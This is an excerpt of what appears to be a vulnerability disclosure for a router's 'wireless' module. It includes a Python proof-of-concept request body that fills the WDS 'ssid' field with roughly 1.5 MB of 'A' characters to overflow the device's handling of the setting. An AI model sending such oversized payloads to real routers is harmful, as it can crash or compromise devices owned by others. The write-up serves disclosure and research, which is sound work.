...
## Vul detail ##
In the router module `wireless`, user can setup wlan bridge parameters with http post request. An normal request looks like below.

![](normal_post_request.png)

After setup wlan bridge, `wireless` module will save data to config file.
...
burp0_json = {"method": "set",
            "wireless":
                {"wlan_wds_2g":
                     {"bssid": "",
                      "enable": "0",
                      "encryption": "1",  # must be 0
                      "key": "AAA",
                      "ssid": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"}
                 }}

burp0_json['wireless']['wlan_wds_2g']['ssid'] = '%s' % ('A' * int(1.5 * 1024 * 1024))
